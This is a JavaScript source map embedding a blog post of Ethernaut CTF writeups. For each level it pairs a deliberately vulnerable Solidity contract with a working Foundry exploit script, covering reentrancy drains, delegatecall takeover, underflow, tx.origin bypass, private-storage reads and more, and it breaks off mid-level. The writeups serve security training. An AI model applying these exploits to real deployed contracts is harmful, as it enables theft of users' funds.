{"version":3,"sources":["../../../../../../../Documents/ShriKrishna/blockchain-developer-portfolio11/lib/blogs/EthernautCTFChallengesWriteups.ts","../../../../../../../Documents/ShriKrishna/blockchain-developer-portfolio11/lib/blogs/GreyCatTheFlag2025RationalChallengeWriteup.ts","../../../../../../../Documents/ShriKrishna/blockchain-developer-portfolio11/lib/blogs/GCCCTF2024web3CTFChallengeWriteUp.ts","../../../../../../../Documents/ShriKrishna/blockchain-developer-portfolio11/lib/blog-data.ts"],"sourcesContent":["import { Blog } from \"../blog-data\";\n\nexport const EthernautCTFChallengesWriteups: Blog = {\n  slug: \"ethernaut-ctf-challenges-writeups\",\n  title: \"Ethernaut CTF Challenges Writeups\",\n  excerpt: \"CTF challenges for best security practices in smart contracts\",\n  date: \"2023-11-01\",\n  readTime: \"30 min read\",\n  tags: [\"Solidity\", \"Ethernaut\", \"Openzeppelin\", \"CTF\", \"Writeups\"],\n  image: \"/ethernaut11.png\",\n  content: `\n\n## Setup\n\nInstall the foundry by using: [https://book.getfoundry.sh/getting-started/installation](https://book.getfoundry.sh/getting-started/installation)\n\nSolved challenges repository: [https://github.com/BhaskarPeruri/OZ_Ethernaut](https://github.com/BhaskarPeruri/OZ_Ethernaut)\n\nThe challenge contracts are in \\`/src\\`.\n\nSolution scripts are in  \\`/script\\`.\n\nSetup the .env file in the repository and fill the following required fields.\n\n\\`\\`\\`\nRPC_URL=\nMY_ADDRESS=\nPRIVATE_KEY=\n\\`\\`\\`\n\n\n## Hello Ethernaut\n\n**Level0.sol**\n\nWe have to deploy the instance and call the info() method on it and follow the given instructions to solve this challenge.\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Instance {\n\n  string public password;\n  uint8 public infoNum = 42;\n  string public theMethodName = 'The method name is method7123949.';\n  bool private cleared = false;\n\n  // constructor\n  constructor(string memory _password) public {\n    password = _password;\n  }\n\n  function info() public pure returns (string memory) {\n    return 'You will find what you need in info1().';\n  }\n\n  function info1() public pure returns (string memory) {\n    return 'Try info2(), but with \"hello\" as a parameter.';\n  }\n\n  function info2(string memory param) public pure returns (string memory) {\n    if(keccak256(abi.encodePacked(param)) == keccak256(abi.encodePacked('hello'))) {\n      return 'The property infoNum holds the number of the next info method to call.';\n    }\n    return 'Wrong parameter.';\n  }\n\n  function info42() public pure returns (string memory) {\n    return 'theMethodName is the name of the next method.';\n  }\n\n  function method7123949() public pure returns (string memory) {\n    return 'If you know the password, submit it to authenticate().';\n  }\n\n  function authenticate(string memory passkey) public {\n    if(keccak256(abi.encodePacked(passkey)) == keccak256(abi.encodePacked(password))) {\n      cleared = true;\n    }\n  }\n\n  function getCleared() public view returns (bool) {\n    return cleared;\n  }\n}\n\n\\`\\`\\`\n\n**Level0Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level0.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level0Sol is Script{\n\n    Instance public level0 = Instance(0x45788399AFea13881872eA360A071f86E3D946fb);\n    function run() external{\n\n        string memory password = level0.password();\n        console.log(\"Password:\",password);\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        level0.authenticate(password);\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level0Solution.s.sol:Level0Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Fallback\n\n**Level1.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objectives --claim ownership of  the token and drain it's eth\ncontract Fallback {\n\n  mapping(address => uint) public contributions;\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n    contributions[msg.sender] = 1000 * (1 ether);\n  }\n\n  modifier onlyOwner {\n        require(\n            msg.sender == owner,\n            \"caller is not the owner\"\n        );\n        _;\n    }\n\n  function contribute() public payable {\n    require(msg.value < 0.001 ether);\n    contributions[msg.sender] += msg.value;\n    if(contributions[msg.sender] > contributions[owner]) {\n      owner = msg.sender;\n    }\n  }\n\n  function getContribution() public view returns (uint) {\n    return contributions[msg.sender];\n  }\n\n  function withdraw() public onlyOwner {\n    payable(owner).transfer(address(this).balance);\n  }\n\n  receive() external payable {\n    require(msg.value > 0 && contributions[msg.sender] > 0);\n    owner = msg.sender;//red flag\n  }\n}\n\n\\`\\`\\`\n\n**Goal:**\n\nWe need to become the owner of the contract and drain all the ether from it.\n\n**Explanation:**\n\n1. To set the owner we need to pass the require check in \\`receive()\\`.\n2. To pass the check we have to send some ether with the transaction.\n3. So, initially we will send contributions and then send some ether to the contract to invoke the \\`receive()\\` method.\n4. Now, we can call \\`withdraw()\\` function to drain the contract.\n\n**Level1Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level1.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level1Sol is Script{\n\n    Fallback public level1 = Fallback(payable(0x6318e52C6f116694A9b99761BdbC96faE1ad5B4E));//pass the contract address deployed on the sepolia testnet\n    function run() external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        level1.contribute{value: 1 wei}();\n        address(level1).call{value: 1 wei}(\"\");\n        console.log(\"New owner:\",level1.owner());\n        console.log(\"My address:\",vm.envAddress(\"MY_ADDRESS\"));\n\n        //once we became the owner of the contract, we can now withdraw\n\n        level1.withdraw();\n\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level1Solution.s.sol:Level1Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Fallout\n\n**Level2.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport 'openzeppelin-contracts-06/math/SafeMath.sol';\n\n//objectives-- claim ownership of the contract\n\ncontract Fallout {\n\n  using SafeMath for uint256;\n  mapping (address => uint) allocations;\n  address payable public owner;\n\n  /* constructor */\n  function Fal1out() public payable {\n    owner = msg.sender;\n    allocations[owner] = msg.value;\n  }\n\n  modifier onlyOwner {\n\t        require(\n\t            msg.sender == owner,\n\t            \"caller is not the owner\"\n\t        );\n\t        _;\n\t    }\n\n  function allocate() public payable {\n    allocations[msg.sender] = allocations[msg.sender].add(msg.value);\n  }\n\n  function sendAllocation(address payable allocator) public {\n    require(allocations[allocator] > 0);\n    allocator.transfer(allocations[allocator]);\n  }\n\n  function collectAllocations() public onlyOwner {\n    msg.sender.transfer(address(this).balance);\n  }\n\n  function allocatorBalance(address allocator) public view returns (uint) {\n    return allocations[allocator];\n  }\n}\n\\`\\`\\`\n\n**Goal**: Claim the ownership of the contract\n\n**Explanation:**\n\n1. In Solidity 0.6.0, the constructor is the function with the same name as the contract.\n2. But in the given challenge, the contract name (\\`Fallout\\`) and the function name(\\`Fal1out\\`) are not the same.\n3. So, we can call this function directly.\n\n**Level2Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"../src/Level2.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level2Sol is Script{\n\n    Fallout public level2 = Fallout(0xaEb939E61726c0f9d0078c3FC1C1508ABa6C26C4);\n    function run() external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        console.log(\"Owner before\",level2.owner());\n        level2.Fal1out();\n        console.log(\"Owner after\",level2.owner());\n        vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level2Solution.s.sol:Level2Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Coin Flip\n\n**Level3.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objective:\n// win the game 10 times at a time\ncontract CoinFlip {\n\n  uint256 public consecutiveWins;\n  uint256 lastHash;\n  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n  constructor() {\n    consecutiveWins = 0;\n  }\n\n  function flip(bool _guess) public returns (bool) {\n    uint256 blockValue = uint256(blockhash(block.number - 1));\n\n    if (lastHash == blockValue) {\n      revert();\n    }\n\n    lastHash = blockValue;\n    uint256 coinFlip = blockValue / FACTOR;\n    bool side = coinFlip == 1 ? true : false;\n\n    if (side == _guess) {\n      consecutiveWins++;\n      return true;\n    } else {\n      consecutiveWins = 0;\n      return false;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nWe have to make the \\`consecutiveWins\\` to 10. We need to guess the coin flip consecutives 10 times.\n\n**Explanation:**\n\n1. We can implement the same logic which is used to find the \\`side\\` of the coin in the \\`CoinFlip\\` contract.\n2. I wrote a player contract which will perform the \\`flip()\\` calculation and sends the value to the \\`CoinFlip\\` contract.\n3. Since the entire computaion in both contracts happens in same transaction, the \\`block.hash\\` and \\`block.number\\` remains same in both contracts.\n4. But we need to run the player script 10 times with a small amount of time delay. Because the last blockhash should not be equal to the current blockhash. So, running script at different times will change the block of the transaction.\n\n**Level3Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level3.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract player{\n      uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;\n\n     constructor(CoinFlip _coinflipInstance){\n            uint256 blockValue = uint256(blockhash(block.number - 1));\n            uint256 coinFlip = blockValue / FACTOR;\n            bool side = coinFlip == 1 ? true : false;\n            _coinflipInstance.flip(side);\n\n     }\n\n}\ncontract Level3Sol is Script{\n\n    CoinFlip public level3 = CoinFlip(0x4d03165ffad46794329037004988b6De42AaC4DB);//pass the contract address deployed on the sepolia testnet\n    function run() external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new player(level3);\n        console.log(\"consecutive wins:\",level3.consecutiveWins());\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level3Solution.s.sol:Level3Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Telephone\n\n**Level4.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Telephone {\n\n  address public owner;\n\n  constructor() {\n    owner = msg.sender;\n  }\n\n  function changeOwner(address _owner) public {\n    if (tx.origin != msg.sender) {\n      owner = _owner;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:** Claim the ownership of the Telephone contract\n\n**Explanation:**\n\n1. If the \\`msg.sender\\` is equals to \\`tx.origin\\` which means the call was from a EOA. If its not, then the call is from a contract.\n2. To bypass that check, I have an written an intermediary contract which will call the \\`changeOwner()\\` function.\n3. Thus \\`msg.sender\\` is our intermediary contract and \\`tx.origin\\` is our EOA.\n4. Simply call the \\`changeOwner()\\` function from the intermediary contract.\n\n**Level4Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level4.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract IntermediatoryContract{\n\n    constructor(Telephone _telephoneInstance, address _newOwner){\n        _telephoneInstance.changeOwner(_newOwner);\n    }\n}\n\ncontract Level4Sol is Script{\n\n    Telephone public level4 = Telephone(0x7Ca95d4b9f0a67539f9A3586e895C67547c76190);\n\n    function run() external{\n\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n    new IntermediatoryContract(\n        level4,vm.envAddress(\"MY_ADDRESS\")\n    );\n\n    vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level4Solution.s.sol:Level4Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Token\n\n**Level5.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\n//objectives :\n//1.take more than 20 tokens\ncontract Token {\n\n  mapping(address => uint) balances;\n  uint public totalSupply;\n\n  constructor(uint _initialSupply) public {\n    balances[msg.sender] = totalSupply = _initialSupply;\n  }\n\n  function transfer(address _to, uint _value) public returns (bool) {\n    require(balances[msg.sender] - _value >= 0);\n    balances[msg.sender] -= _value;\n    balances[_to] += _value;\n    return true;\n  }\n\n  function balanceOf(address _owner) public view returns (uint balance) {\n    return balances[_owner];\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nWe have initial token balance of 20, we need to take more than 20 tokens.\n\n**Explanation:**\n\n1. This contract uses solidity pragma \\`0.6.0\\`, in which no arithmetic overflow/underflow checks are not performed by default.\n2. In \\`transfer()\\` function the require check can be bypassed when we pass value as more than 20.\n3. 20 - 21 = -1 which results in \\`2**256 - 1\\`. Which is \\`>= 0\\` and the same will happens in the update of balance at sender.\n4. \\`balances[msg.sender] -= _value;\\` will become balance[msg.sender] = 20 - 21 = 2\\*\\*256 -1.\n\n**Level5Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.0;\n\nimport \"../src/Level5.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level5Sol is Script{\n\n    Token public level5 = Token(0xf363A66580c0E202396333d08Fc53e18cbcc625F);\n\n    function run() external{\n\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n    console.log(\"total supply:\",level5.totalSupply());\n    level5.transfer(address(0),21);\n    console.log(\"MY balance:\",level5.balanceOf(vm.envAddress(\"MY_ADDRESS\")));\n    vm.stopBroadcast();\n    }\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level5Solution.s.sol:Level5Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Delegation\n\n**Level6.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\n//objective:\n//claim ownership\n\ncontract Delegate {\n\n  address public owner;\n\n  constructor(address _owner) {\n    owner = _owner;\n  }\n\n  function pwn() public {\n    owner = msg.sender;\n  }\n}\n\ncontract Delegation {\n\n  address public owner;\n  Delegate delegate;\n\n  constructor(address _delegateAddress) {\n    delegate = Delegate(_delegateAddress);\n    owner = msg.sender;\n  }\n\n  fallback() external {\n    (bool result,) = address(delegate).delegatecall(msg.data);\n    if (result) {\n      this;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\nClaim ownership of Delegation contract\n\n**Explanation:**\n\n1. \\`Delegation\\` contracts uses delegatecall to call the other contract \\`Delegate\\`.\n2. One thing to remember with delegatecall is that it will maintain the \\`msg.sender\\` and \\`msg.value\\` when it calls other contract.\n3. And also it updates the caller contract storage not the contract which being called.\n4. So, when we call \\`pwn()\\` on the Delegation address it will forward the call to Delegate contract and updates the owner variable in Delegation contract.\n\n**Level6Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level6.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level6Sol is Script{\n\n    Delegation public level6 = Delegation(0xCAfBaEb598da2251121AD148766f2a6c4B4C2dB7);\n\n    function run()  external{\n\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        console.log(\"Initial Owner : \", level6.owner());\n\n        address(level6).call(abi.encodeWithSignature(\"pwn()\"));\n\n        console.log(\"Final Owner : \", level6.owner());\n        vm.stopBroadcast();\n\n    }\n\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level6Solution.s.sol:Level6Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Force\n\n**Level7.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Force {/*\n\n                   MEOW ?\n         /\\_/\\   /\n    ____/ o o \\\n  /~____  =ø= /\n (______)__m_m)\n\n*/}\n\\`\\`\\`\n\n**Goal:**\n\nWe need to make the balance of the Force contract more than 0.\n\n**Explanation:**\n\n1. There is no \\`receive()/fallback()\\` function and no payable functions in the Force contract.\n2. If we send any ether to this contract it will be reverted.\n3. One thing , we can do is that deploy a contract with some ether and implement a \\`selfdestruct\\` function and pass the recepient as the \\`Force\\` contract address.\n4. Upon selfdestruct of the Attack contract, Force contract will receive ether.\n\n**Level7Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract ToBeDestructed{\n    constructor(address payable _forceAddress) payable{\n        selfdestruct(_forceAddress);\n    }\n}\n\ncontract Level7Sol is Script{\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n        new ToBeDestructed{value: 1 wei}(payable(0x562488c3a3f2208737b860fF335cfBc3CD306865));\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level7Solution.s.sol:Level7Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Vault\n\n**Level8.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Vault {\n  bool public locked;\n  bytes32 private password;\n\n  constructor(bytes32 _password) {\n    locked = true;\n    password = _password;\n  }\n\n  function unlock(bytes32 _password) public {\n    if (password == _password) {\n      locked = false;\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nWe need to unlock the vault.\n\n**Explanation**:\n\n1. We can simply call the \\`unlock()\\` function with password. But the password was not publicly accessible.\n2. Declaring a variable \\`private\\` doesn’t mean that no one can read that variable. Only the other contracts which interacts with it won’t able to view that variable.\n3. We can solve this by two ways, one is using with foundry \\`vm.load\\` and another is using with blockchain explorer(Sepolia Etherscan).\n4. I used \\`vm.load\\`. in foundry.\n\n**Level8Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level8.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level8Sol is Script{\n\n     Vault public level8 = Vault(0x826c120B1C2b48fd2ad8C7015BcbfFe33A851E7A);\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        bytes32 password = vm.load(address(level8), bytes32(uint256(1)));\n        console.logBytes32(password);\n        level8.unlock(password);\n\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level8Solution.s.sol:Level8Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## King\n\n**Level9.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract King {\n\n  address king;\n  uint public prize;\n  address public owner;\n\n  constructor() payable {\n    owner = msg.sender;\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  receive() external payable {\n    require(msg.value >= prize || msg.sender == owner);\n    payable(king).transfer(msg.value);\n    king = msg.sender;\n    prize = msg.value;\n  }\n\n  function _king() public view returns (address) {\n    return king;\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nBe the \\`King\\` and make others dont claim the \\`King\\` position again.\n\n**Explanation:**\n\n1. Initially check the \\`prize\\` amount that need to send to be the king. And send the \\`prize\\` amount to the \\`King\\` contract.\n2. When someone send the \\`prize\\` amount back to us to claim the king position, we can deny the money.\n3. So, that they wont be the king anymore.\n4. In order to deny the prize, we can write a contract which sends prize to the king contract and dont implement any \\`receive()/fallback()\\` function.\n5. This will revert others transaction when they sends prize to us, So, we will remain as the king.\n\n**Level9Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level9.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n    constructor(King _kingInstance) payable {\n        address(_kingInstance).call{value:_kingInstance.prize()}(\"\");//calling the receiver function in King contract\n    }\n    //since there is no fallback or receive function in this contract ,we can successfully denied the money\n}\n\ncontract Level9Sol is Script{\n\n    King public kingInstance = King(payable(0xb6Db4938daB72C9e2DF8a19eE5846D2692872441));\n\n    function run() external {\n    vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n    console.log(\"first King is :\",kingInstance._king());\n    console.log(\"first prize is:\",kingInstance.prize());\n\n    new Attack{value:kingInstance.prize()}(kingInstance);\n\n    console.log(\"second King is :\",kingInstance._king());\n    console.log(\"second prize is:\",kingInstance.prize());\n\n    vm.stopBroadcast();\n\n    }\n\n}\n\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level9Solution.s.sol:Level9Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Reentrancy\n\n**Level10.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport 'openzeppelin-contracts-06/math/SafeMath.sol';\n\ncontract Reentrance {\n\n  using SafeMath for uint256;\n  mapping(address => uint) public balances;\n\n  function donate(address _to) public payable {\n    balances[_to] = balances[_to].add(msg.value);\n  }\n\n  function balanceOf(address _who) public view returns (uint balance) {\n    return balances[_who];\n  }\n\n  function withdraw(uint _amount) public {\n    if(balances[msg.sender] >= _amount) {\n      (bool result,) = msg.sender.call{value:_amount}(\"\");\n      if(result) {\n        _amount;\n      }\n      balances[msg.sender] -= _amount;\n    }\n  }\n\n  receive() external payable {}\n}\n\n\\`\\`\\`\n\n**Goal:**\n\nDrain all the ether of the Reentrance contract.\n\n**Explanation**:\n\n1. The \\`withdraw()\\` function is vulnerable to \\`Reentrancy\\`, as it is updating the user balance after the external call.\n2. One could deposit some ether to pass the require check in withdraw and and call the withdraw from a contract in which a fallback function is implemented in such a way that it is re entered into withdraw again.\n3. So, we will donate some ether to the contract and then call withdraw from a contract.\n4. The withdraw call send our ether back and invokes the fallback or receive function of our contract.\n5. We can call the \\`withdraw()\\` function again from the fallback function to reenter again into \\`Reentrance\\` contract.\n6. Still we can manage to pass require check as our balance wasn’t updated yet.\n7. We need to check the balance of the \\`Reentrance\\` contract before reentering because when we call the withdraw again after the balance of \\`Reentrance\\` becomes zero will revert the entire transaction.\n\n**Level10Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.6.12;\n\nimport \"../src/Level10.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Attack{\n\n    Reentrance public r_instance =Reentrance(0x1e5f76396a5b433c9c462c919dAf64Eed6bD4926);\n\n    function exploit() external payable{\n\n        r_instance.donate{value: 0.001 ether}(address(this));\n        r_instance.withdraw(0.001 ether);\n    }\n    receive() external payable{\n        if(address(r_instance).balance >= 0.001 ether){\n             r_instance.withdraw(0.001 ether);\n        }\n    }\n}\n\ncontract Level10Sol is Script{\n    function run() external {\n            vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n            new Attack().exploit{value: 0.001 ether}();\n            vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level10Solution.s.sol:Level10Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Elevator\n\n**Level11.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ninterface Building {\n  function isLastFloor(uint) external returns (bool);\n}\n\ncontract Elevator {\n  bool public top;\n  uint public floor;\n\n  function goTo(uint _floor) public {\n    Building building = Building(msg.sender);\n\n    if (! building.isLastFloor(_floor)) {\n      floor = _floor;\n      top = building.isLastFloor(floor);\n    }\n  }\n}\n\\`\\`\\`\n\n**Goal:**\n\nWe need to get to the top floor, i.e make the top boolean to \\`true\\`.\n\n**Explanation:**\n\n1. The Elevator calling the \\`isLastFloor()\\` function on \\`msg.sender\\` which is insecure. Dont trust the unknown libraries or contract while making the calls.\n2. The \\`top\\` variable is being updated upon the return value of the \\`isLastFloor()\\` function.\n3. But, To pass the \\`if\\` condition the \\`isLastFloor()\\` should return the \\`false\\`. But the \\`top\\` will become \\`false\\` only if it results false everytime.\n4. We can observe that the \\`isLastFloor()\\` function is being called twice. So, we can write a contract which implements \\`isLastFloor()\\` function in such a way that is returns \\`false\\` on first call and \\`true\\` on second call.\n5. So, that the \\`if\\` condition satisfies and \\`top\\` will be updated to true.\n\n**Level11Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level11.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level11Sol is Script{\n     Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);\n    function run() external{\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n         new Attack().exploit();\n        vm.stopBroadcast();\n    }\n}\ncontract Attack{\n    Elevator public instance = Elevator(0x8Ad804B2A6907983267C2ef6A962d50F5C63A694);\n    uint public floor;\n    function exploit() external{\n        instance.goTo(3);\n    }\n    function isLastFloor(uint _floor)external returns(bool){\n        if(floor == _floor){\n            return true;\n        }\n         floor = _floor;\n        return false;\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level11Solution.s.sol:Level11Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Privacy\n\n**Level12.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract Privacy {\n\n  bool public locked = true;\n  uint256 public ID = block.timestamp;\n  uint8 private flattening = 10;\n  uint8 private denomination = 255;\n  uint16 private awkwardness = uint16(block.timestamp);\n  bytes32[3] private data;\n\n  constructor(bytes32[3] memory _data) {\n    data = _data;\n  }\n\n  function unlock(bytes16 _key) public {\n    require(_key == bytes16(data[2]));\n    locked = false;\n  }\n\n  /*\n    A bunch of super advanced solidity algorithms...\n\n      ,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`\n      .,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,\n      *.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^         ,---/V\\\n      \\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.    ~|__(o.o)\n      ^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'^\\`*.,*'  UU  UU\n  */\n}\n\n\\`\\`\\`\n\n**Goal:**\n\nWe need to unlock the contract, i.e call \\`unlock()\\` function with right password.\n\n**Explanation:**\n\n1. This challenge is similar to \\`Vault\\`. But we need to understand the storage layout of this contract and query the exact passwor storage slot of the contract.\n2. The storage layout of contract as follows :\n\n   \\`\\`\\`solidity\n   \\`bool public locked = true;                                  // slot 0\n   uint256 public ID = block.timestamp;                        // slot 1\n   uint8 private flattening = 10;                              // slot 2\n   uint8 private denomination = 255;                           // slot 2\n   uint16 private awkwardness = uint16(block.timestamp);       // slot 2\n   bytes32[3] private data;  // data[0] => slot 3\\`\n                             // data[1] => slot 4'\n                             // data[2] => slot 5\\`\n   \\`\\`\\`\n\n3. Password is the lower 16 bytes of the \\`data[2]\\`, i.e \\`require(_key == bytes16(data[2]));\\`\n4. Since the \\`data[2]\\` stored at slot 5, we can query it with \\`vm.load\\` cheatcode.\n5. Calling unlock with this password will solve the challenge.\n\n**Level12Solution.s.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\nimport \"../src/Level12.sol\";\nimport \"forge-std/Script.sol\";\nimport \"forge-std/console.sol\";\n\ncontract Level12Sol is Script{\n\n    Privacy public instance = Privacy(0x80AeDd671Abb04118998A8baAd7B879aA53756f9) ;\n\n    function run() external {\n        vm.startBroadcast(vm.envUint(\"PRIVATE_KEY\"));\n\n        bytes32 slot5_data = vm.load(address(instance),bytes32(uint256(5)));\n        instance.unlock(bytes16(slot5_data));\n\n        vm.stopBroadcast();\n    }\n}\n\\`\\`\\`\n\n**To run the script**\n\n\\`\\`\\`\n$ source .env\n$ forge script script/Level12Solution.s.sol:Level12Sol --rpc-url $RPC_URL --broadcast\n\\`\\`\\`\n\n## Gatekeeper One\n\n**Level13.sol**\n\n\\`\\`\\`solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.0;\n\ncontract GatekeeperOne {\n\n  address public entrant;\n\n  modifier gateOne() {\n    require(msg.sender != tx.origin);\n    _;\n  }\n\n  modifier gateTwo() {\n    require(gasleft() % 8191 == 0);\n    _;\n  }\n\n  modifier gateThree(bytes8 _gateKey) {\n      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), \"GatekeeperOne: 